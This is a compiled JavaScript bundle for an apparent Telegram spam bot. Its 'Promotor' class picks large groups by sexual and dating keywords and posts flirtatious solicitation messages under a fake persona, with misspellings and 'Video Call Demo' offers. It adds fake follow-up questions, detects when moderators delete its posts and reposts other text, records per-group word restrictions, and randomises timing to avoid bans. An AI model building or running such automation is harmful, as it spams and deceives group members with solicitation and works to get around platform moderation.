                    messages.push(extracted);
                }
            }
            return messages.join('\n');
        }
        // Fallback
        return '';
    }
    catch (error) {
        console.error("Error in extractMessage:", error);
        return `Error extracting message: ${error instanceof Error ? error.message : String(error)}`;
    }
}
/**
 * Sends an HTTP notification
 * @param url - URL to send notification to
 * @param timeout - Request timeout in ms
 * @returns Promise resolving to response or undefined on error
 */
function sendNotification(url_1) {
    return __awaiter(this, arguments, void 0, function* (url, timeout = DEFAULT_ERROR_CONFIG.notificationTimeout) {
        try {
            // Validate URL before sending
            if (!url || typeof url !== 'string' || !url.startsWith('http')) {
                console.error("Invalid notification URL:", url);
                return undefined;
            }
            return yield axios_1.default.get(url, {
                timeout,
                validateStatus: status => status < 500 // Consider 4xx as "successful" notifications
            });
        }
        catch (error) {
            console.error("Failed to send notification:", error instanceof Error ? error.message : String(error));
            return undefined;
        }
    });
}
/**
 * Checks if an error should be ignored for notification
 * @param message - Error message to check
 * @param status - HTTP status code
 * @param patterns - RegExp patterns to ignore
 * @returns Boolean indicating if error should be ignored
 */
function shouldIgnoreError(message, status, patterns) {
    if (status === 429)
        return true; // Always ignore rate limiting errors
    return patterns.some(pattern => pattern.test(message));
}
/**
 * Extracts status code from error or response object
 * @param err - Error object to parse
 * @param defaultStatus - Default status code if none found
 * @returns HTTP status code
 */
function extractStatusCode(err, defaultStatus) {
    var _a, _b, _c;
    if (!err)
        return defaultStatus;
    // Try to extract from response
    if (err.response) {
        const response = err.response;
        return ((_a = response.data) === null || _a === void 0 ? void 0 : _a.statusCode) ||
            ((_b = response.data) === null || _b === void 0 ? void 0 : _b.status) ||
            ((_c = response.data) === null || _c === void 0 ? void 0 : _c.ResponseCode) ||
            response.status ||
            err.status ||
            defaultStatus;
    }
    // Try direct properties
    return err.statusCode || err.status || defaultStatus;
}
/**
 * Extracts error message from error or response object
 * @param err - Error object to parse
 * @param defaultMessage - Default message if none found
 * @returns Extracted error message
 */
function extractErrorMessage(err, defaultMessage) {
    var _a, _b, _c, _d, _e, _f;
    if (!err)
        return defaultMessage;
    // Error message from response
    if ((_a = err.response) === null || _a === void 0 ? void 0 : _a.data) {
        const responseData = err.response.data;
        return responseData.message ||
            responseData.errors ||
            responseData.ErrorMessage ||
            responseData.errorMessage ||
            responseData.UserMessage ||
            (typeof responseData === 'string' ? responseData : null) ||
            err.response.statusText ||
            err.message ||
            defaultMessage;
    }
    // Error message from request
    if (err.request) {
        return ((_b = err.data) === null || _b === void 0 ? void 0 : _b.message) ||
            ((_c = err.data) === null || _c === void 0 ? void 0 : _c.errors) ||
            ((_d = err.data) === null || _d === void 0 ? void 0 : _d.ErrorMessage) ||
            ((_e = err.data) === null || _e === void 0 ? void 0 : _e.errorMessage) ||
            ((_f = err.data) === null || _f === void 0 ? void 0 : _f.UserMessage) ||
            (typeof err.data === 'string' ? err.data : null) ||
            err.message ||
            err.statusText ||
            'The request was triggered but no response was received';
    }
    // Direct error message
    return err.message || err.errorMessage || defaultMessage;
}
/**
 * Extracts error type from error or response object
 * @param err - Error object to parse
 * @param defaultError - Default error type if none found
 * @returns Error type as string
 */
function extractErrorType(err, defaultError) {
    var _a, _b;
    if (!err)
        return defaultError;
    if ((_b = (_a = err.response) === null || _a === void 0 ? void 0 : _a.data) === null || _b === void 0 ? void 0 : _b.error) {
        return err.response.data.error;
    }
    return err.error || err.name || err.code || defaultError;
}
/**
 * Parses and standardizes error objects for consistent handling
 * @param err - Error to parse
 * @param prefix - Prefix to add to error message
 * @param sendErr - Whether to send a notification for this error
 * @param config - Error handling configuration
 * @returns Standardized error response
 */
function parseError(err, prefix, sendErr = true, config = {}) {
    // Merge with default config
    const fullConfig = Object.assign(Object.assign({}, DEFAULT_ERROR_CONFIG), config);
    try {
        const clientId = process.env.clientId || 'PingerService';
        const prefixStr = `${clientId}${prefix ? ` - ${prefix}` : ''}`;
        // Extract error components
        const status = extractStatusCode(err, fullConfig.defaultStatus);
        const rawMessage = extractErrorMessage(err, fullConfig.defaultMessage);
        const error = extractErrorType(err, fullConfig.defaultError);
        // Process the raw message to get a clean version
        let extractedMessage;
        try {
            extractedMessage = typeof rawMessage === 'string' ? rawMessage : extractMessage(rawMessage);
        }
        catch (e) {
            extractedMessage = safeStringify(rawMessage) || 'Error extracting message';
        }
        // Prepare the full message for logging
        const fullMessage = `${prefixStr} :: ${extractedMessage}`;
        console.log("parsedErr: ", fullMessage);
        // Prepare response object
        const response = {
            status,
            message: err.errorMessage ? err.errorMessage : String(fullMessage).slice(0, fullConfig.maxMessageLength),
            error,
            raw: err
        };
        // Send notification if requested and applicable
        if (sendErr) {
            try {
                const ignoreError = shouldIgnoreError(fullMessage, status, fullConfig.ignorePatterns);
                if (!ignoreError) {
                    const notificationMessage = err.errorMessage ? err.errorMessage : extractedMessage;
                    const notifUrl = `${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(prefixStr)} :: ${encodeURIComponent(notificationMessage)}`;
                    // Use Promise but don't await to avoid delaying the response
                    sendNotification(notifUrl, fullConfig.notificationTimeout)
                        .catch(e => console.error("Failed to send error notification:", e));
                }
            }
            catch (notificationError) {
                console.error('Failed to prepare error notification:', notificationError);
            }
        }
        return response;
    }
    catch (fatalError) {
        console.error("Fatal error in parseError:", fatalError);
        return {
            status: fullConfig.defaultStatus,
            message: "Error in error handling",
            error: "FatalError",
            raw: err
        };
    }
}
/**
 * Type guard for Axios errors
 * @param error - Error to check
 * @returns Boolean indicating if error is an Axios error
 */
function isAxiosError(error) {
    return axios_1.default.isAxiosError(error);
}
/**
 * Creates error objects with consistent format
 * @param message - Error message
 * @param status - HTTP status code
 * @param errorType - Error type
 * @returns Standardized error response
 */
function createError(message, status = 500, errorType = 'ApplicationError') {
    return {
        status,
        message,
        error: errorType
    };
}
/**
 * Error handling utilities for HTTP requests and responses
 */
exports.ErrorUtils = {
    parseError,
    extractMessage,
    sendNotification,
    createError,
    isAxiosError
};


/***/ }),

/***/ "./src/utils/promotions.ts":
/*!*********************************!*\
  !*** ./src/utils/promotions.ts ***!
  \*********************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.Promotor = void 0;
const dbservice_1 = __webpack_require__(/*! ../dbservice */ "./src/dbservice.ts");
const utils_1 = __webpack_require__(/*! ../utils */ "./src/utils.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ./fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const parseError_1 = __webpack_require__(/*! ./parseError */ "./src/utils/parseError.ts");
const messages_1 = __webpack_require__(/*! ../messages */ "./src/messages.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const logbots_1 = __webpack_require__(/*! ./logbots */ "./src/utils/logbots.ts");
const index_1 = __webpack_require__(/*! ../index */ "./src/index.ts");
class Promotor {
    constructor(client) {
        this.promoteCount = 0;
        this.promoting = false;
        this.promoteErrorCount = 0;
        this.promoteMsgs = {};
        this.promotedCount = 0;
        this.lastMessageTime = Date.now() - 240000;
        this.client = client;
    }
    // public async mockPromotions() {
    //     setInterval(async () => {
    //         const db = UserDataDtoCrud.getInstance()
    //         await db.updatePromoteStats('mock');
    //     }, 5 * 60 * 1000)
    // }
    static getInstance(client) {
        if (!Promotor.instance) {
            Promotor.instance = new Promotor(client);
        }
        return Promotor.instance;
    }
    logDetails(level, message, details = {}) {
        const timestamp = new Date().toISOString();
        console.log(`[${timestamp}] [${level}] ${message}`, details);
    }
    fetchDialogs() {
        return __awaiter(this, void 0, void 0, function* () {
            const channelIds = [];
            try {
                // Fetch dialogs with a limit
                const dialogs = yield this.client.getDialogs({ limit: 500 });
                this.logDetails("INFO", `Fetched ${dialogs.length} dialogs.`);
                const unreadUserDialogs = [];
                let channelData = [];
                // Process each dialog
                for (const dialog of dialogs) {
                    if (dialog.isUser && dialog.unreadCount > 0) {
                        const userEntity = dialog.entity.toJSON();
                        if (!userEntity.bot) {
                            unreadUserDialogs.push(dialog);
                        }
                    }
                    else if (dialog.isChannel || dialog.isGroup) {
                        const chatEntity = dialog.entity.toJSON();
                        const { id, defaultBannedRights, broadcast, participantsCount, restricted } = chatEntity;
                        // Filter channels that meet criteria
                        if (!broadcast && !(defaultBannedRights === null || defaultBannedRights === void 0 ? void 0 : defaultBannedRights.sendMessages) && !restricted && id && participantsCount > 500) {
                            const channelId = id.toString().replace(/^-100/, "");
                            channelData.push({ channelId, participantsCount });
                        }
                    }
                }
                if ((0, index_1.daysLeftForRelease)() < 1) {
                    let bannedChannelsFromPromotions = [];
                    // Attempt to fetch banned channels, with a fallback if an error occurs
                    try {
                        const response = yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${process.env.promoteRepl}/getbannedchannels`);
                        if (response.data) {
                            if (Array.isArray(response.data)) {
                                bannedChannelsFromPromotions = response.data;
                                this.logDetails("INFO", `Fetched ${bannedChannelsFromPromotions.length} banned channels.`);
                            }
                            else {
                                this.logDetails("WARN", "Unexpected data format for banned channels, proceeding without filtering.");
                            }
                        }
                    }
                    catch (fetchError) {
                        this.logDetails("ERROR", "Error fetching banned channels:", { error: fetchError });
                    }
                    // If we have banned channels, filter them out; otherwise, proceed with all eligible channels
                    if (bannedChannelsFromPromotions.length > 0) {
                        channelData = channelData.filter(channel => !bannedChannelsFromPromotions.includes(channel.channelId));
                        this.logDetails("INFO", `Filtered channels, remaining: ${channelData.length}`);
                    }
                    else {
                        this.logDetails("WARN", "No banned channels retrieved; proceeding with all eligible channels.");
                    }
                }
                // Select the top 150 channels
                const topChannels = channelData.slice(0, 150);
                for (const channel of topChannels) {
                    channelIds.push(channel.channelId);
                }
                this.logDetails("INFO", `Selected top ${topChannels.length} channels for promotion.`);
                // Process unread user dialogs
                (0, utils_1.replyUnread)(this.client, unreadUserDialogs);
            }
            catch (error) {
                this.logDetails("ERROR", "Failed to fetch channels while promoting", { error });
                (0, parseError_1.parseError)(error, "Failed to fetch channels while promoting");
                yield (0, utils_1.startNewUserProcess)(error);
            }
            return channelIds;
        });
    }
    getChannelInfo(channelId) {
        return __awaiter(this, void 0, void 0, function* () {
            const db = dbservice_1.UserDataDtoCrud.getInstance();
            let channelInfo = yield db.getActiveChannel({ channelId: channelId });
            if (!channelInfo) {
                channelInfo = yield (0, utils_1.getIChannelFromTg)(channelId);
                yield db.updateActiveChannel({ channelId: channelId }, channelInfo);
            }
            return channelInfo;
        });
    }
    PromoteToGrp() {
        return __awaiter(this, void 0, void 0, function* () {
            var _a, _b;
            this.promoteCount++;
            this.logDetails("INFO", `promoteErrorCount: ${this.promoteErrorCount} || promoting : ${this.promoting}`);
            // this.mockPromotions();
            if (this.client && !this.promoting && this.client.connected) {
                try {
                    this.promoteErrorCount = 0;
                    this.promoting = true;
                    this.promoteCount = 0;
                    this.lastMessageTime = Date.now();
                    const db = dbservice_1.UserDataDtoCrud.getInstance();
                    while (true) {
                        // Refresh message stats on each iteration
                        this.msgStats = yield (0, utils_1.getTotalMsgAndUserCount)();
                        (0, utils_1.setMsgstats)(this.msgStats);
                        const isLimitReached = this.msgStats.totalCount > 3800 || this.msgStats.userCount > 300;
                        const paidUserStats = yield db.getTodayPaidUsers();
                        if (isLimitReached || ((paidUserStats === null || paidUserStats === void 0 ? void 0 : paidUserStats.total) > 33) || ((paidUserStats === null || paidUserStats === void 0 ? void 0 : paidUserStats.new) > 15)) {
                            (0, parseError_1.parseError)({ message: "Not Proceeding With Promotion as Limit Reached for the day!!" }, "Promotions Stopped");
                            yield db.deactivatePromotions();
                            break; // Exit the loop when limits are reached
                        }
                        else {
                            const channelIds = yield this.fetchDialogs();
                            this.logDetails("INFO", `STARTED GROUP PROMOTION: LastTime - ${this.promotedCount} - ${channelIds.length}`);
                            const promotedStats = yield db.readPromoteStats();
                            this.promoteMsgs = yield db.getPromoteMsgs();
                            this.promotedCount = 0;
                            let channelIndex = 0;
                            for (const channelId of channelIds) {
                                try {
                                    yield this.client.connect();
                                    if (channelIndex >= channelIds.length || this.promoteCount > 2) {
                                        this.promoting = false;
                                        this.logDetails("WARN", "Force restarting promotions");
                                        setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                            yield this.PromoteToGrp();
                                        }), 10000);
                                        break;
                                    }
                                    // Use consistent limit check
                                    if (this.promoteErrorCount > 3 || isLimitReached) {
                                        yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${process.env.clientId.toUpperCase()}: PROMOTIONS STOPPED Forcefully to restart again`)}`);
                                        yield db.deactivatePromotions();
                                        if ((promotedStats === null || promotedStats === void 0 ? void 0 : promotedStats.releaseDay) < Date.now()) {
                                            yield (0, utils_1.checktghealth)(this.client);
                                        }
                                        yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)(process.env.accountsChannel)}&text=${encodeURIComponent(`@${process.env.clientId.toUpperCase()}: Failed - ${this.promoteErrorCount} | BROKE PROMOTION`)}`);
                                        this.promoting = false;
                                        break;
                                    }
                                    yield this.sendPromotionalMessage(channelId, false, 0);
                                    channelIndex++; // Increment the channel index
                                }
                                catch (error) {
                                    this.logDetails("ERROR", `FAILED: ${channelId}`, { error: error.errorMessage });
                                    channelIndex++; // Ensure index is incremented even on error
                                }
                            }
                        }
                        // Add a safety check for the loop
                        if (!((_a = this.client) === null || _a === void 0 ? void 0 : _a.connected) || this.promoteErrorCount > 5) {
                            this.logDetails("WARN", "Breaking promotion loop due to connection issues or too many errors");
                            break;
                        }
                        yield (0, Helpers_1.sleep)(30000);
                    }
                }
                catch (error) {
                    (0, parseError_1.parseError)(error, "Promotion Broke: ");
                    if ((_b = error.errorMessage) === null || _b === void 0 ? void 0 : _b.toString().includes('AUTH_KEY_DUPLICATED')) {
                        yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)(process.env.accountsChannel)}&text=${encodeURIComponent(`@${process.env.clientId.toUpperCase()}: AUTH KEY DUPLICATED`)}`);
                    }
                }
                finally {
                    this.promoting = false; // Ensure promoting is set to false
                    yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)(process.env.accountsChannel)}&text=${encodeURIComponent(`@${process.env.clientId.toUpperCase()}: Promotions Stopped!!`)}`);
                }
            }
            else {
                this.logDetails("INFO", "EXISTING PROMOTION!!");
                if (this.lastMessageTime < Date.now() - 7 * 60 * 1000) {
                    this.promoting = false;
                    setTimeout(() => {
                        this.PromoteToGrp();
                    }, 10000);
                }
                const db = dbservice_1.UserDataDtoCrud.getInstance();
                const userPromoteStats = yield db.readPromoteStatsTime();
                if ((userPromoteStats === null || userPromoteStats === void 0 ? void 0 : userPromoteStats.isActive) && this.promoteCount > 2 && (Date.now() - (userPromoteStats === null || userPromoteStats === void 0 ? void 0 : userPromoteStats.lastUpdatedTimeStamp)) / (1000 * 60) > 12) {
                    yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${process.env.clientId.toUpperCase()}: EXITING AS ERROR AT PROMOTIONS`)}`);
                    // process.exit(1);
                }
            }
        });
    }
    shouldNotMatch(obj) {
        const regex = /(online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser)/i;
        const titleMatch = obj.title && !regex.test(obj.title);
        const usernameMatch = obj.username && !regex.test(obj.username);
        return !!(titleMatch || usernameMatch);
    }
    shouldMatch(obj) {
        const regex = /(wife|adult|lanj|chat|𝑭𝒂𝒎𝒊𝒍𝒚|𝙏𝙖𝙢𝙞𝙡|𝐒𝐖𝐀𝐏|lesb|aunty|girl|boy|tamil|kannad|telugu|hindi|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi)/i;
        const titleMatch = obj.title && regex.test(obj.title);
        const usernameMatch = obj.username && regex.test(obj.username);
        return !!(titleMatch || usernameMatch);
    }
    sendPromotionalMessage(channelId_1, isLatest_1) {
        return __awaiter(this, arguments, void 0, function* (channelId, isLatest, promotedStats = 0) {
            var _a;
            try {
                const db = dbservice_1.UserDataDtoCrud.getInstance();
                const greetings = ['Hellloooo', 'Hiiiiii', 'Oyyyyyy', 'Oiiiii', 'Haaiiii', 'Hlloooo', 'Hiiii', 'Hyyyyy', 'Oyyyyye', 'Oyeeee', 'Heyyy'];
                const emojis = (0, utils_1.generateEmojis)();
                const randomEmoji = (0, utils_1.getRandomEmoji)();
                const hour = this.getCurrentHourIST();
                const isMorning = (hour > 9 && hour < 22);
                const offset = Math.floor(Math.random() * 3);
                const endMsg = (0, messages_1.pickOneMsg)(['U bussy👀?', "I'm Aviilble!!😊💦", 'Trry Once!!😊💦', 'Trry Once!!😊💦', 'Waiiting fr ur mssg.....Dr!!💦', 'U Onliine?👀', "I'm Avilble!!😊", 'U Bussy??👀💦', 'U Intrstd??👀💦', 'U Awakke?👀💦', 'U therre???💦💦']);
                const msg = `**${(0, messages_1.pickOneMsg)(greetings)}_._._._._._._!!**${emojis}\n.\n.\n**${endMsg}**`; //\n\n${(isMorning) ? "Just Now I Came from My **College!!**" : "I am Alone in My **Hostel Room** Now!!"}🙈🙈\n\n**${endMsg}**`
                const addon = (offset !== 1) ? `${(offset === 2) ? `**\n\n\n             TODAAY's OFFFER:\n-------------------------------------------\n𝗩𝗲𝗱𝗶𝗼 𝗖𝗮𝗹𝗹 𝗗𝗲𝗺𝗼 𝗔𝘃𝗶𝗹𝗯𝗹𝗲${randomEmoji}${randomEmoji}\n𝗩𝗲𝗱𝗶𝗼 𝗖𝗮𝗹𝗹 𝗗𝗲𝗺𝗼 𝗔𝘃𝗶𝗹𝗯𝗹𝗲${randomEmoji}${randomEmoji}\n-------------------------------------------**` : `**\n\nJUST Trry Once!!😚😚\nI'm Freee Now!!${(0, utils_1.generateEmojis)()}`}**` : `${(0, utils_1.generateEmojis)()}`; //${randomEmoji}\n-------------------------------------------\n   ${emojis}${emojis}${emojis}${emojis}\n========================` : ""}**`;
                const isLimitReached = (this.msgStats.totalCount > 3500 || this.msgStats.userCount > 300);
                const channelInfo = yield this.getChannelInfo(channelId);
                if (!this.shouldMatch(channelInfo)) {
                    // await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`${process.env.clientId?.toUpperCase()} :: UNMATCHED Channel:\n\n${channelInfo.title}\n${channelInfo.username}`)}`);
                }
                console.log("fetched ChannelInfo :", channelInfo.banned);
                if (!(channelInfo === null || channelInfo === void 0 ? void 0 : channelInfo.banned) && this.shouldNotMatch(channelInfo) && this.shouldMatch(channelInfo)) {
                    console.log(`${channelInfo === null || channelInfo === void 0 ? void 0 : channelInfo.title} - WordRestriction: ${channelInfo === null || channelInfo === void 0 ? void 0 : channelInfo.wordRestriction} | AvailableMsgsLength: ${(_a = channelInfo === null || channelInfo === void 0 ? void 0 : channelInfo.availableMsgs) === null || _a === void 0 ? void 0 : _a.length}`);
                    if ((channelInfo === null || channelInfo === void 0 ? void 0 : channelInfo.availableMsgs) == undefined) {
                        yield db.updateActiveChannel({ channelId: channelInfo.channelId }, { dMRestriction: 0, wordRestriction: 0, availableMsgs: utils_1.defaultMessages });
                        channelInfo.availableMsgs = utils_1.defaultMessages;
                    }
                    let message;
                    let defaultMsg = false;
                    let randomIndex = (0, utils_1.selectRandomElements)(channelInfo.availableMsgs, 1)[0];
                    if (channelInfo.wordRestriction === 0) {
                        message = yield this.sendMessageToChannel(channelInfo, { message: msg + addon });
                    }
                    else {
                        if (channelInfo.availableMsgs.length == 0) {
                            channelInfo.availableMsgs = ['0'];
                            defaultMsg = true;
                        }
                        const randomAvailableMsg = this.promoteMsgs[randomIndex];
                        message = yield this.sendMessageToChannel(channelInfo, { message: randomAvailableMsg });
                    }
                    if (message) {
                        yield this.broadcast(`SENT TO GROUP: ${channelInfo === null || channelInfo === void 0 ? void 0 : channelInfo.title}`, `  @${channelInfo.username} :: ${randomIndex} :: ${message === null || message === void 0 ? void 0 : message.id}`);
                        this.promoteErrorCount = 0;
                        this.promotedCount++;
                        this.retryMessageSending(channelInfo, message === null || message === void 0 ? void 0 : message.id, randomIndex, undefined, false, defaultMsg);
                        this.scheduleFollowUpMessage(channelInfo, isLimitReached);
                        const outerLimit = (0, index_1.daysLeftForRelease)() < 0 ? Math.floor(Math.random() * (180000 - 60000 + 1)) + 250000 : Math.floor(Math.random() * (120000 - 60000 + 1)) + 60000;
                        // const outerLimit = 250000 //60000 + (20 * Math.floor(localMsgStats().hourQueue.length / 10) * 1000) + Math.max(0, 30000 * (Math.floor(this.msgStats.userCount / 50) - 1));
                        console.log("OuterLimit : ", outerLimit);
                        yield (0, Helpers_1.sleep)(outerLimit);
                        return;
                    }
                    else {
                        yield this.broadcast(`FAILED SEND IN GROUP: ${channelInfo === null || channelInfo === void 0 ? void 0 : channelInfo.title}`, `  @${channelInfo.username} :: ${randomIndex}`);
                        yield (0, Helpers_1.sleep)(30000);
                        return;
                    }
                }
                else {
                    console.log("Banned Channel");
                }
            }
            catch (error) {
                console.error(`Error sending promotional message to ${channelId}:`, error);
                this.promoteErrorCount++;
                return new Promise((resolve) => {
                    setTimeout(() => {
                        resolve(true);
                    }, 4000);
                });
            }
        });
    }
    scheduleFollowUpMessage(channelInfo, isLimitReached) {
        return __awaiter(this, void 0, void 0, function* () {
            const innerLimit = 223000 + Math.floor(Math.random() * 5000) + Math.max(0, 20000 * (Math.floor(this.msgStats.userCount / 100) - 1));
            if (!isLimitReached) {
                // console.log(`Conditions met for sending follow-up message : limit -- ${innerLimit} Next : ${new Date(Date.now() + innerLimit).toLocaleString('en-IN').split(',')[1]}`);
                yield (0, Helpers_1.sleep)(innerLimit);
                let followUpMsg;
                let defaultMsg2 = false;
                let randomIndex = (0, utils_1.selectRandomElements)(channelInfo.availableMsgs, 1)[0];
                // await broadcast(`SENDING Follow-up MESSAGE: ${channelInfo?.title}`, `  @${channelInfo.username}  : ${channelInfo.participantsCount}`);
                if (channelInfo.wordRestriction === 0) {
                    // console.log('Sending default follow-up message');
                    followUpMsg = yield this.sendMessageToChannel(channelInfo, { message: `**I have One Douut.....!!\n\nCan Anyone Clarify me Plsss??😭😭${(0, utils_1.generateEmojis)()}**` });
                }
                else {
                    if (channelInfo.availableMsgs.length == 0) {
                        channelInfo.availableMsgs = ['0'];
                        defaultMsg2 = true;
                    }
                    const randomAvailableMsg = this.promoteMsgs[randomIndex];
                    // console.log('Sending follow-up message from available messages');
                    followUpMsg = yield this.sendMessageToChannel(channelInfo, { message: randomAvailableMsg });
                }
                if (followUpMsg) {
                    yield this.broadcast(`Follow-up message SENT TO GROUP: ${channelInfo === null || channelInfo === void 0 ? void 0 : channelInfo.title}`, `  @${channelInfo.username} :: ${randomIndex} :: ${followUpMsg === null || followUpMsg === void 0 ? void 0 : followUpMsg.id}`);
                    this.retryMessageSending(channelInfo, followUpMsg === null || followUpMsg === void 0 ? void 0 : followUpMsg.id, randomIndex, 10000, true, defaultMsg2);
                }
                else {
                    yield this.broadcast(`FAILED to send follow-up message IN GROUP: ${channelInfo === null || channelInfo === void 0 ? void 0 : channelInfo.title}`, `  @${channelInfo.username} :: ${randomIndex}`);
                    yield (0, Helpers_1.sleep)(30000);
                }
            }
            else {
                console.log('Message limits exceeded, not sending follow-up');
            }
        });
    }
    sendMessageToChannel(channelInfo, message) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                // Attempt to send the message to the specified channel
                const msg = yield this.client.sendMessage(channelInfo.username ? `@${channelInfo.username}` : channelInfo.channelId, message);
                this.lastMessageTime = Date.now();
                return msg;
            }
            catch (error) {
                console.log(`Error sending message to ${channelInfo.channelId}:`, error);
                if (error.errorMessage === "CHANNEL_PRIVATE") {
                    return yield this.handlePrivateChannel(channelInfo, message, error);
                }
                else {
                    return yield this.handleOtherErrors(channelInfo, message, error);
                }
            }
        });
    }
    handlePrivateChannel(channelInfo, message, error) {
        return __awaiter(this, void 0, void 0, function* () {
            const db = dbservice_1.UserDataDtoCrud.getInstance();
            if (channelInfo && channelInfo.username) {
                try {
                    // Attempt to send the message using the channel's username
                    return yield this.client.sendMessage(channelInfo.username, message);
                }
                catch (err) {
                    console.error(`Error retrying message for private channel ${channelInfo.username}:`, err);
                    if (err.errorMessage === "CHANNEL_PRIVATE") {
                        yield db.updateActiveChannel({ channelId: channelInfo.channelId }, { private: true });
                    }
                    return undefined;
                }
            }
            return undefined;
        });
    }
    handleOtherErrors(channelInfo, message, error) {
        return __awaiter(this, void 0, void 0, function* () {
            const db = dbservice_1.UserDataDtoCrud.getInstance();
            (0, parseError_1.parseError)(error, `Error sending message to ${channelInfo.channelId} (@${channelInfo.username}):`, false);
            if (error.errorMessage === 'USER_BANNED_IN_CHANNEL') {
                const result = yield (0, utils_1.checktghealth)(this.client);
                // if (!result && daysLeftForRelease() < 0) {
                //     await leaveChannel(client, channelInfo);
                // }
            }
            else if (error.errorMessage === 'CHAT_WRITE_FORBIDDEN') {
                yield (0, utils_1.leaveChannel)(this.client, channelInfo);
            }
            return undefined;
        });
    }
    checkAndResendMessage(chat_1, sentMessageId_1, nextMessageIndex_1, existingMsgIndex_1, attemptCount_1) {
        return __awaiter(this, arguments, void 0, function* (chat, sentMessageId, nextMessageIndex, existingMsgIndex, attemptCount, recursionCount = 0, isDoubtMessage = false) {
            var _a;
            try {
                yield this.client.connect();
                const messageContent = nextMessageIndex ? this.promoteMsgs[nextMessageIndex] : this.promoteMsgs["0"];
                const db = dbservice_1.UserDataDtoCrud.getInstance();
                // Update word restriction if necessary
                if (!isDoubtMessage && (attemptCount > chat.wordRestriction || chat.wordRestriction === undefined)) {
                    yield db.updateActiveChannel({ channelId: chat.channelId }, { wordRestriction: attemptCount });
                }
                // Update DM restriction if necessary
                if (isDoubtMessage && (attemptCount > chat.dMRestriction || chat.dMRestriction === undefined)) {
                    yield db.updateActiveChannel({ channelId: chat.channelId }, { dMRestriction: attemptCount });
                }
                let sentMessage = undefined;
                console.log(`Checking message:: @${chat.username} || existingMessage: ${existingMsgIndex} || nextMessage: ${nextMessageIndex} || sentMessageId : ${sentMessageId} || Attempt: ${attemptCount} || Recursion: ${recursionCount}`);
                try {
                    const messages = yield this.client.getMessages(chat.channelId, { ids: sentMessageId });
                    sentMessage = messages[0];
                }
                catch (error) {
                    console.log(`Error fetching sent message:`, error);
                }
                if (!sentMessage) {
                    yield this.broadcast(`MESSGAE DELETED FROM GROUP ===: ${chat.title}`, `Available: ${chat.availableMsgs.length} @${chat.username}: ${existingMsgIndex} || sentMessageId : ${sentMessageId} || Attempt: ${attemptCount} || Recursion: ${recursionCount}`);
                    yield this.handleDeletedMessage(chat, existingMsgIndex, sentMessageId, attemptCount);
                    const msg = yield this.sendMessageToChannel(chat, { message: messageContent });
                    return msg === null || msg === void 0 ? void 0 : msg.id;
                }
                else {
                    yield this.broadcast(`MESSAGE EXISTS, All GOOD === : ${chat.title}`, `@${chat.username}: ${existingMsgIndex} || sentMessageId : ${sentMessageId} || Attempt: ${attemptCount} || Recursion: ${recursionCount}`);
                    if (attemptCount > 0) {
                        yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`${(_a = process.env.clientId) === null || _a === void 0 ? void 0 : _a.toUpperCase()} :: MESSAGE EXISTS, All GOOD: ${chat.title}\n@${chat.username}\nexistingMsgIndex: ${existingMsgIndex}\nsentMessageId:${sentMessageId}\nAttempt: ${attemptCount}\nRecursion: ${recursionCount}\nhttps://t.me/${chat.username}/${sentMessageId}`)}`);
                    }
                    yield this.handleExistingMessage(chat, existingMsgIndex, sentMessageId);
                    return undefined;
                }
            }
            catch (error) {
                console.error(`Error checking and resending message:`, error);
                if (error.seconds && recursionCount < 3) {
                    return yield this.checkAndResendMessage(chat, sentMessageId, nextMessageIndex, existingMsgIndex, attemptCount, recursionCount + 1, isDoubtMessage);
                }
                else {
                    return undefined;
                }
            }
        });
    }
    handleDeletedMessage(chat, messageIndex, sentMessageId, attemptCount) {
        return __awaiter(this, void 0, void 0, function* () {
            var _a, _b, _c;
            const db = dbservice_1.UserDataDtoCrud.getInstance();
            if (chat.availableMsgs.length === 0 || attemptCount === 3) {
                yield db.updateActiveChannel({ channelId: chat.channelId }, { banned: true });
                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`${(_a = process.env.clientId) === null || _a === void 0 ? void 0 : _a.toUpperCase()}: Banned Channel 1\nattempt=${attemptCount}\nR=${messageIndex}\n@${chat.username}`)}`);
            }
            else {
                const result = yield db.removeFromAvailableMsgs({ channelId: chat.channelId }, messageIndex);
                if (result.modifiedCount) {
